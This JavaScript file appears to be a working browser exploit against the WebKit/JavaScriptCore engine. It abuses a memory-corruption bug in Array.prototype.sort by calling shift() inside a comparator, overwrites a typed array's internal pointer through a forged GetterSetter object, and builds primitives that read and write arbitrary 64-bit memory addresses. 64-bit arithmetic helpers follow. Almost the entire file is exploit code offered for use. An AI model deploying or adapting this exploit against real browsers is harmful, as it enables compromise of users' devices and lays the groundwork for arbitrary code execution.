// global vars
var _gc, _cnt = 0;
var _u32baseptr;

function getU32arbitary(att, base_to_set)
{
	try {
    //
    // Part 1: getting the Uint32Array object address
    //
	    // init vars
	    var u32 = new Uint32Array(0x100);
	    var a1 = [0,1,2,3,u32];
	    var a2 = [0,1,2,3,4]; // right after a1
	    var a1len = a1.length;
	    var a2len = a2.length;
	    var u32len = u32.length;

	    // protect local vars from GC // for gdb
	    if (!_gc) _gc = new Array();
	    _gc.push(u32,a1,a2);

	    // declare custom compare function
	    var myCompFunc = function(x,y)
	    {
	    	// check for the last call for last two array items
	    	if (y == 3 && x == u32) {
	    		logAdd("myCompFunc(u32,3)");
	    		// shift() is calling during sort(), what causes the
	    		// last array item is written outside the array buffer
	    		a1.shift();
	    	}
	    	return 0;
	    }

	    // call the vulnerable method - JSArray.sort(...)
	    a1.sort(myCompFunc);

	    // check results: a2.length should be overwritten by a1[4]
	    var len = a2.length;
	    logAdd("a2.length = 0x" + len.toString(16));
	    if (len == a2len) { logAdd("error: 1"); return 1; }

    //
    // Part 2: creating corrupted JSValue which points to the (u32+0x18) address
    //

	  	// modify our compare function
		myCompFunc = function(x,y)
		{
	    	if (y == 0 && x == 1) {
	    		logAdd("myCompFunc(1,0)");
	    		// call shift() again to read the corrupted JSValue from a2.length
	    		// into a1[3] on the next sort loop
	    		a1.length = a1len;
	    		a1.shift();
	    		// modify JSValue
	    		a2.length = len + 0x18;
	    	}
	    	if (y == 3) {
	    		logAdd("myCompFunc(x,3)");
	    		// shift it back to access a1[3]
	    		a1.unshift(0);
	    	}
	    	return 0;
	    }

		a1.sort(myCompFunc);

		// now a1[3] should contain the corrupted JSValue from a2.length (=len+0x18)
		var c = a2.length;
		logAdd("a2.length = 0x" + c.toString(16));
		if (c != len + 0x18) { logAdd("error: 2"); a1[3] = 0; return 2; }

	//
	// Part 3: overwriting ((JSUint32Array)u32).m_impl pointer (see JSCTypedArrayStubs.h)
	//

	   	// generate dummy JS functions
	    var f, f2, f2offs, f2old, funcs = new Array(30);
	    c = funcs.length;
	    for(var i=0; i < c; i++){
	   		f = new Function("arg", " return 876543210 + " + (_cnt++) + ";");
	    	f.prop2 = 0x12345600 + i;
	    	funcs[i] = f;
	    }

	    // generate JIT-code
		for(var i=c-1; i >= 0; i--) { funcs[i](i); }

		// prepare objects for the third sort() call
		var mo = {};
	    var pd = { set: funcs[0], enumerable:true, configurable:true }
		var a3 = [0,1,2,a1[3]];

		// allocate mo's property storage right after a3's buffer
	    Object.defineProperty(mo, "prop0", pd);
	    for(var i=1; i < 5; i++){
	    	mo["prop"+i] = i;
	    }

	    // protect from GC
	    _gc.push(a3,mo,funcs);

		// use sort-n-shift technique again
		myCompFunc = function(x,y)
		{
	    	// check for the last call for two last array items
	    	if (y == 2) {
	    		logAdd("myCompFunc(a3[3],2)");
	    		// a3[3] will be written over the mo.prop0 object
	    		a3.shift();
	    	}
	    	return 0;
	    }

		// overwrite mo.prop0 by a3[3] = a1[3] = &u32+0x18
	    a3.sort(myCompFunc);

	    // u32.prop1 has 0x20 offset inside u32, and 0x08 inside mo.prop0 GetterSetter object.
	    // we should put some valid pointers into GetterSetter
	    u32.prop1 = u32; 	// GetterSetter.m_structure
	    u32.prop2 = 8; 		// 8 = JSType.GetterSetterType
	    u32.prop1 = a1[3];  // bypass JSCell::isGetterSetter()

	    // clear corrupted JSValue
	    a1[3] = 0; a3[3] = 0;

	    // overwrite u32.m_impl by some JSFunction object
	    f = funcs[c-5];
	    pd.set = f;
	    Object.defineProperty(mo, "prop0", pd);

		// check results: u32.length is taken from f's internals now
		logAdd("u32.length = 0x" + u32.length.toString(16));
		if (u32.length == u32len) { logAdd("error: 3"); return 3; }

	//
	//  Part 4: getting the JIT-code memory address
	//

		// declare aux functions
		var setU64 = function(offs, val) {
			u32[offs]   = val % 0x100000000;
			u32[offs+1] = val / 0x100000000;
		}
		var getU64 = function(offs) {
			return u32[offs] + u32[offs+1] * 0x100000000;
		}
		var getObjAddr = function(obj) {
			// write obj into u32 data
			pd.set.prop2 = obj;
			// read obj address from u32
			return getU64(2);
		}

		// get the memory address of u32
		var u32addr = getObjAddr(u32);
		logAdd("u32 address = 0x" + u32addr.toString(16));

		// get the memory address of u32[0] (ArrayBufferView.m_baseAddress)
		var u32base = getObjAddr(pd.set) + 0x20;
		var u32base0 = u32base;
		logAdd("u32 base = 0x" + u32base.toString(16));

		// on x64 platforms we can't just set u32.length to the huge number
		// for ability to access arbitrary addresses. We should be able to
		// modify the u32's buffer pointer on-the-fly.
		var setBase = function(addr){
			if (!f2) {
				// search for another JSFunction near "f"
				for(var i=0x12; i < 0x80; i+=0x10){
					if ((u32[i] >>> 8) == 0x123456) {
						f2 = funcs[u32[i] & 0xFF];
						f2offs = i - 6;
						f2old = getU64(f2offs);
						break;
					}
				}
				logAdd("f2offs = 0x" + f2offs);
				if (!f2) { return false; }

			}
			if (pd.set != f) {
				pd.set = f;
    			Object.defineProperty(mo, "prop0", pd);
    			u32base = u32base0;
			}
			if (addr == null) return true;

			// this will be the new value for ((ArrayBufferView)u32).m_baseAddress
			setU64(f2offs, addr);

			// overwrite ((JSUint32Array)u32).m_impl again
			pd.set = f2;
    		Object.defineProperty(mo, "prop0", pd);

			u32base = addr;
			logAdd("u32 new base = 0x" + u32base.toString(16));

			return true;
		}
		
		var getBasePtr = function(){
			if (!f2) {
				// search for another JSFunction near "f"
				for(var i=0x12; i < 0x80; i+=0x10){
					if ((u32[i] >>> 8) == 0x123456) {
						f2 = funcs[u32[i] & 0xFF];
						f2offs = i - 6;
						f2old = getU64(f2offs);
						break;
					}
				}
				if (!f2) { return 0; }

			}
			if (pd.set != f) {
				pd.set = f;
    			Object.defineProperty(mo, "prop0", pd);
    			u32base = u32base0;
			}

			return f2offs + u32base;
		}

	// read/write the 64-bit value from the custom address
		var getU64from = function(addr) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return getU64((addr - u32base) >>> 2);
		}
		var setU64to = function(addr,val) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return setU64((addr - u32base) >>> 2, val);
		}


		logAdd("u32 size: 0x" + u32.length.toString(16));
		
		if(base_to_set != 0)
			setBase(base_to_set);
		return u32;

	}
	catch(e) {
	    logAdd(e);
	}

	return 0;
}

var getU64byOffset = function(offs, u32) {
	return u32[offs] + u32[offs+1] * 0x100000000;
}

var toU64 = function(u32_1, u32_2)
{
	return u32_1 + u32_2 * 0x100000000;
}

var andU64 = function(u64, mask)
{
	var tmp_mask1, tmp_mask2, tmp_u32_1, tmp_u32_2;
	tmp_mask1 = mask % 0x100000000;
	tmp_mask2 = mask / 0x100000000;
	tmp_u32_1 = u64 % 0x100000000;
	tmp_u32_2 = u64 / 0x100000000;
	
	return (tmp_mask1 & tmp_u32_1) + ((tmp_mask2 & tmp_u32_2)*0x100000000);
}

var biggerThenU64 = function(u64_1, u64_2, min, rnd)
{
	var tmp_u32_11, tmp_u32_12, tmp_u32_21, tmp_u32_22;
	tmp_u32_11 = u64_1 % 0x100000000;
	tmp_u32_12 = u64_2 % 0x100000000;
	
	if(tmp_u32_12 < min)
		return 0;
	
	if(tmp_u32_12 < tmp_u32_11)
		return 1;
		
	if(tmp_u32_12 > tmp_u32_11)
		return 0;	
	
	tmp_u32_21 = u64_1 / 0x100000000;
	tmp_u32_22 = u64_2 / 0x100000000;
	
	if(tmp_u32_22 < tmp_u32_21)
		return 1;
	else
		return 0;
}

var biggerThenU32 = function(tmp_u32_11, tmp_u32_12, tmp_u32_21, tmp_u32_22)
{

	if(tmp_u32_12 < tmp_u32_11)
		return 1;
		
	if(tmp_u32_12 > tmp_u32_11)
		return 0;
		
	if(tmp_u32_22 < tmp_u32_21)
		return 1;
	else
		return 0;
}

var toU32 = function(u64)
{
	var tmp = [(u64 % 0x100000000), (u64 / 0x100000000)];
	return tmp;
}